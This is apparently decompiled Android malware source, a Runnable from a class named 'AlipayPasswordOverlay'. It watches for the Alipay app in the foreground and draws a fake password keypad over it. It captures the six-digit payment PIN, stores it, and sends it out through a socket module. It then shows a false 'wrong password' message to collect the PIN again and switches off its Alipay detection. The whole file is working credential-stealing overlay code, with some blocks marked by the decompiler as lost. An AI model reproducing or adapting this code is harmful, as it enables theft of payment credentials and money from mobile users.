package p000;

import android.os.Handler;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.TextView;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.overlay.C0353a0;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: r9 */
/* loaded from: classes2.dex */
public final /* synthetic */ class RunnableC1172r9 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f59646a0;

    /* renamed from: a1 */
    public final /* synthetic */ C0353a0 f59647a1;

    public /* synthetic */ RunnableC1172r9(C0353a0 c0353a0, int i) {
        this.f59646a0 = i;
        this.f59647a1 = c0353a0;
    }

    /* JADX WARN: Code restructure failed: missing block: B:74:0x018d, code lost:
    
        r2.post(new p000.RunnableC1172r9(r1, 5));
        r1.f53615a4 = "";
     */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x019c, code lost:
    
        if (r1.f53614a3 == false) goto L157;
     */
    /* JADX WARN: Code restructure failed: missing block: B:76:0x019e, code lost:
    
        r1.m211899a4();
     */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        WindowManager windowManager;
        C0323a8 c0323a8M211471g5;
        switch (this.f59646a0) {
            case 0:
                C0353a0 c0353a0 = this.f59647a1;
                try {
                    dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                    String str = "";
                    if (c0290a0 != null) {
                        C0614i9 c0614i9 = c0290a0.f52414e5;
                        String str2 = c0614i9 != null ? c0614i9.f56832b2 : "";
                        if (str2 != null) {
                            str = str2;
                        }
                    }
                    t60.m214702c3("AlipayPasswordOverlay", "🔍 3秒后检查，当前前台包名: ".concat(str));
                    String[] strArr = {"com.eg.android.AlipayGphone", "com.alipay.android.phone", "com.alipay.mobile"};
                    for (int i = 0; i < 3; i++) {
                        if (AbstractC0779a1.m213652a5(str, strArr[i], false)) {
                            t60.m214714d6("AlipayPasswordOverlay", "🔄 用户关闭密码框但仍在支付宝，重新弹窗");
                            c0353a0.f53618a7.post(new RunnableC1172r9(c0353a0, 2));
                            break;
                        }
                    }
                    t60.m214702c3("AlipayPasswordOverlay", "📱 用户已离开支付宝，不再弹窗");
                    break;
                } catch (Exception e) {
                    t60.m214705c6("AlipayPasswordOverlay", "❌ 检查是否重新弹窗失败", e);
                    return;
                }
            case 1:
                C0353a0 c0353a02 = this.f59647a1;
                try {
                    FrameLayout frameLayout = c0353a02.f53613a2;
                    c0353a02.f53613a2 = null;
                    c0353a02.f53617a6 = null;
                    c0353a02.f53616a5.clear();
                    if (frameLayout != null) {
                        try {
                            if (frameLayout.isAttachedToWindow() && (windowManager = c0353a02.f53612a1) != null) {
                                windowManager.removeView(frameLayout);
                            }
                        } catch (Exception e2) {
                            t60.m214726f4("AlipayPasswordOverlay", "移除视图时出错: " + e2.getMessage());
                        }
                    }
                    break;
                } catch (Exception e3) {
                    t60.m214705c6("AlipayPasswordOverlay", "❌ 隐藏悬浮窗失败", e3);
                    return;
                }
            case 2:
                C0353a0 c0353a03 = this.f59647a1;
                try {
                    if (c0353a03.f53614a3) {
                        t60.m214726f4("AlipayPasswordOverlay", "⚠️ 悬浮窗已显示，忽略重复调用");
                    } else {
                        c0353a03.f53615a4 = "";
                        c0353a03.f53616a5.clear();
                        c0353a03.m211895a0();
                        c0353a03.f53614a3 = true;
                    }
                    break;
                } catch (Exception e4) {
                    t60.m214705c6("AlipayPasswordOverlay", "❌ 显示悬浮窗失败", e4);
                    return;
                }
            case 3:
                C0353a0 c0353a04 = this.f59647a1;
                boolean z = c0353a04.f53614a3;
                if (z) {
                    Handler handler = c0353a04.f53618a7;
                    if (z && c0353a04.f53615a4.length() == 6) {
                        String str3 = c0353a04.f53615a4;
                        if (str3.length() == 6) {
                            int i2 = 0;
                            while (true) {
                                if (i2 >= str3.length()) {
                                    break;
                                } else if (str3.charAt(i2) == str3.charAt(0)) {
                                    i2++;
                                } else {
                                    int length = str3.length();
                                    int i3 = 1;
                                    while (true) {
                                        if (i3 >= length) {
                                            break;
                                        } else if (str3.charAt(i3) - str3.charAt(i3 - 1) != 1) {
                                            int length2 = str3.length();
                                            for (int i4 = 1; i4 < length2; i4++) {
                                                if (str3.charAt(i4 - 1) - str3.charAt(i4) == 1) {
                                                }
                                            }
                                            break;
                                        } else {
                                            i3++;
                                        }
                                    }
                                }
                            }
                        }
                        String str4 = c0353a04.f53615a4;
                        try {
                            c0353a04.m211898a3(str4, "alipay_" + str4.length() + "digit", System.currentTimeMillis());
                            try {
                                C0107as c0106ar = C0107as.f45610a3.getInstance(c0353a04.f53611a0);
                                int length3 = str4.length();
                                c0106ar.m210506a5(length3 != 4 ? length3 != 6 ? "none" : "6digit" : "4digit", true, str4);
                            } catch (Exception e5) {
                                t60.m214705c6("AlipayPasswordOverlay", "❌ 保存支付宝密码到 AppStatusManager 失败", e5);
                            }
                            dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
                            if (c0290a02.getInstance() != null) {
                                String str5 = "支付宝密码输入: ***（长度=" + str4.length() + "）";
                                AbstractC0770a1.m213614f9(new Pair("textLength", Integer.valueOf(str4.length())), new Pair("inputMethod", "alipay_overlay_keypad"), new Pair("containsPassword", Boolean.TRUE), new Pair("operationType", "ALIPAY_PASSWORD_INPUT"), new Pair("source", "AlipayPasswordOverlay"), new Pair("passwordLength", Integer.valueOf(str4.length())));
                                dqtvuisjd.m211435k0("TEXT_INPUT", str5);
                                try {
                                    dqtvuisjd c0290a03 = c0290a02.getInstance();
                                    if (c0290a03 != null && (c0323a8M211471g5 = c0290a03.m211471g5()) != null) {
                                        c0323a8M211471g5.m211662c8(str4, "alipay", "overlay_keypad");
                                    }
                                } catch (Exception e6) {
                                    t60.m214705c6("AlipayPasswordOverlay", "❌ 通过Socket发送密码失败", e6);
                                }
                                try {
                                    dqtvuisjd c0290a04 = dqtvuisjd.f52358m1.getInstance();
                                    if (c0290a04 != null) {
                                        c0290a04.m211455e4();
                                    }
                                } catch (Exception e7) {
                                    t60.m214705c6("AlipayPasswordOverlay", "❌ 自动关闭支付宝检测功能失败", e7);
                                }
                            }
                        } catch (Exception e8) {
                            t60.m214705c6("AlipayPasswordOverlay", "❌ 记录支付宝密码日志失败", e8);
                        }
                        handler.postDelayed(new RunnableC1172r9(c0353a04, 4), 1000L);
                        break;
                    }
                }
                break;
            case 4:
                C0353a0 c0353a05 = this.f59647a1;
                if (c0353a05.f53614a3) {
                    c0353a05.m211897a2(true);
                    break;
                }
                break;
            default:
                TextView textView = this.f59647a1.f53617a6;
                if (textView != null) {
                    textView.setText("密码错误，请重新输入");
                    textView.setVisibility(0);
                    textView.requestLayout();
                    textView.invalidate();
                    t60.m214702c3("AlipayPasswordOverlay", "📛 显示错误提示: ".concat("密码错误，请重新输入"));
                    break;
                } else {
                    t60.m214704c5("AlipayPasswordOverlay", "❌ errorTextView 为空，无法显示错误提示");
                    break;
                }
        }
    }
}
